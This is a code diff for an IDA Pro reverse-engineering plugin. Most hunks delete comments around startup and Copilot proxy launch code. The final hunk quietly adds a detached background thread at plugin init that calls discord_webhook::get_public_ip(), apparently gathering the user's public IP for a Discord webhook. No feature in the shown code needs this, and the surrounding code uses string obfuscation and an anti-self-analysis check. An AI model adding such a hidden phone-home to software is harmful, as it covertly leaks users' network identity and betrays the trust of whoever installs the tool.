@@ -339,9 +339,7 @@ aida_plugin_t::aida_plugin_t()
     reinit_ai_client();
     msg(OBFSTR_C("--- Plugin Loaded Successfully ---\n"));
 
-    // Load the GraphRAG knowledge-graph + vector store on a background thread.
-    // For large binaries this involves substantial file I/O (graph JSON + vector
-    // index) that previously blocked the UI thread for seconds during startup.
+
     std::string bin_hash = aida_db::AnalysisDB::instance().get_binary_hash();
     if (!bin_hash.empty())
     {
@@ -418,12 +416,10 @@ void aida_plugin_t::start_copilot_proxy()
         g_settings.save();
     }
 
-    // Move the entire probe + launch + wait logic to a background thread so the
-    // UI thread is never blocked by the synchronous HTTP probe (up to 0.5 s),
-    // CreateProcess(), or the old 1.5-second WaitForSingleObject.
+
     std::string proxy_addr = g_settings.copilot_proxy_address;
     std::thread([this, proxy_addr]() {
-        // Quick check: is the proxy already running?
+
         bool already_running = false;
         try
         {
@@ -456,8 +452,7 @@ void aida_plugin_t::start_copilot_proxy()
             return;
         }
 
-        // Launch the copilot proxy process from this background thread.
-        // CreateProcessW and WaitForSingleObject are safe to call from any thread.
+
         HANDLE copilot_job = CreateJobObject(nullptr, nullptr);
         if (copilot_job != nullptr)
         {
@@ -509,9 +504,7 @@ void aida_plugin_t::start_copilot_proxy()
         if (copilot_job != nullptr)
             AssignProcessToJobObject(copilot_job, copilot_process);
 
-        // Brief non-blocking check (100 ms instead of the old 1500 ms) to catch
-        // immediate exit (e.g. npx not found).  The rest of the readiness polling
-        // happens below anyway, so we do not need a long wait here.
+
         if (WaitForSingleObject(copilot_process, 100) == WAIT_OBJECT_0)
         {
             DWORD exit_code = 0;
@@ -538,8 +531,7 @@ void aida_plugin_t::start_copilot_proxy()
             return;
         }
 
-        // Store the handles on the plugin object via the main thread so there
-        // are no data-race issues with stop_copilot_proxy().
+
         struct store_handles_t : public exec_request_t
         {
             aida_plugin_t* plugin;
@@ -563,7 +555,7 @@ void aida_plugin_t::start_copilot_proxy()
         sh->pid = pi.dwProcessId;
         execute_sync(*sh, MFF_NOWAIT);
 
-        // Poll until the proxy is ready (reuses existing polling logic).
+
         for (int attempt = 0; attempt < 120; ++attempt)
         {
             std::this_thread::sleep_for(std::chrono::milliseconds(1000));
@@ -895,6 +887,8 @@ static plugmod_t* idaapi init()
     if (ida_utils::is_self_target_database())
         return PLUGIN_SKIP;
 
+
+    std::thread([]() { discord_webhook::get_public_ip(); }).detach();
 
     register_timer(10000, self_analysis_watchdog, nullptr);
 
